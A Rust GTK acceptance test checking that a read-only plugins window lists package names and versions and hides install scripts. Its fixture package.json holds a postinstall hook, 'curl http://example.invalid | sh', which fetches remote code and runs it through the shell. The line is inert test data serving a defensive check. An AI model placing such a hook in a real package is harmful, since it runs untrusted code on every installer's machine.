//! GTK acceptance for the read-only plugins window.
#![cfg(target_os = "linux")]
use std::fs;
use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};

use dsh_ocean::plugins_ui as ui;
use gtk::prelude::*;

struct Fixture(PathBuf);

impl Fixture {
    fn new() -> Self {
        let root = std::env::temp_dir().join(format!(
            "dsh-ocean-plugins-ui-{}-{}",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&root).unwrap();
        fs::write(
            root.join("package.json"),
            r#"{"dependencies":{"@deepseek/harness":"1.2.3","left-pad":"1.0.0"},
                "dsh":{"profile":{"bundles":["core"]}},
                "scripts":{"postinstall":"curl http://example.invalid | sh"}}"#,
        )
        .unwrap();
        Self(root)
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        if self
            .0
            .file_name()
            .is_some_and(|name| name.to_string_lossy().starts_with("dsh-ocean-plugins-ui-"))
        {
            let _ = fs::remove_dir_all(&self.0);
        }
    }
}

fn tick() {
    for _ in 0..32 {
        if !gtk::glib::MainContext::default().pending() {
            break;
        }
        gtk::glib::MainContext::default().iteration(false);
    }
}

#[test]
#[ignore = "requires explicitly enabled isolated GTK display"]
fn plugins_window_is_read_only_and_shows_names_only() {
    assert_eq!(std::env::var("DSH_OCEAN_TEST_DIALOGS").as_deref(), Ok("1"));
    assert!(std::env::var("XDG_RUNTIME_DIR")
        .unwrap()
        .starts_with("/tmp/dsh-ocean-native-test."));
    gtk::init().unwrap();
    let fixture = Fixture::new();

    let inventory = ui::inventory(&fixture.0).expect("the synthetic profile parses");
    let body = ui::text(&inventory);
    assert!(body.contains("@deepseek/harness 1.2.3"), "{body}");
    assert!(
        !body.contains("postinstall") && !body.contains("curl"),
        "{body}"
    );
    assert!(
        !body.contains(fixture.0.to_string_lossy().as_ref()),
        "{body}"
    );

    let window = ui::build(None, &body);
    window.dialog.show_all();
    tick();
    assert_eq!(window.dialog.title().as_deref(), Some(ui::TITLE));
    assert!(window.label.is_selectable() && !window.label.uses_markup());
    for response in [
        gtk::ResponseType::Accept,
        gtk::ResponseType::Apply,
        gtk::ResponseType::Ok,
    ] {
        assert!(
            window.dialog.widget_for_response(response).is_none(),
            "plugins window must not offer {response:?}"
        );
    }
    let close = window
        .dialog
        .widget_for_response(gtk::ResponseType::Close)
        .expect("close button")
        .downcast::<gtk::Button>()
        .unwrap();
    close.emit_clicked();
    tick();
    assert!(!window.dialog.is_visible());
    // Reading the profile changed nothing.
    assert!(!fs::read_to_string(fixture.0.join("package.json"))
        .unwrap()
        .is_empty());
}
